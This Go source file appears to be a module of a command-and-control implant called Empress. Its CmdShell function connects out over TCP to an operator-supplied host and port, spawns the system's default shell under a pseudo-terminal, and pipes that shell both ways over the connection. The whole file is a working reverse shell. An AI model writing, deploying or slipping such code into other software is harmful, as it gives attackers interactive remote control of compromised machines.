package system

import (
	"errors"
	"github.com/creack/pty"
	"github.com/pygrum/Empress/transport"
	"golang.org/x/term"
	"io"
	"net"
	"os"
	"os/exec"
)

// CmdShell https://github.com/creack/pty
func CmdShell(req *transport.Request, response *transport.Response) {
	if len(req.Args) != 2 {
		transport.ResponseWithError(response, errors.New("host and port not provided"))
		return
	}
	host := string(req.Args[0])
	port := string(req.Args[1])

	addr := net.JoinHostPort(host, port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	startPTY(conn, response)
}

func startPTY(conn net.Conn, resp *transport.Response) {
	sh := os.Getenv("SHELL")
	if len(sh) == 0 {
		transport.ResponseWithError(resp, errors.New("could not acquire default shell"))
		return
	}
	c := exec.Command(sh)
	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		transport.ResponseWithError(resp, err)
		return
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Set stdin in raw mode.
	file, err := conn.(*net.TCPConn).File()
	if err == nil {
		fd := file.Fd()
		oldState, err := term.MakeRaw(int(fd))
		if err == nil {
			defer func() { _ = term.Restore(int(fd), oldState) }() // Best effort.
		}
	}

	// Copy stdin to the pty and the pty to stdout.
	// NOTE: The goroutine will keep reading until the next keystroke before returning.
	go func() {
		_, _ = io.Copy(conn, ptmx)
	}()
	transport.AddResponse(resp, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestNone,
	})
	_, _ = io.Copy(ptmx, conn)
}
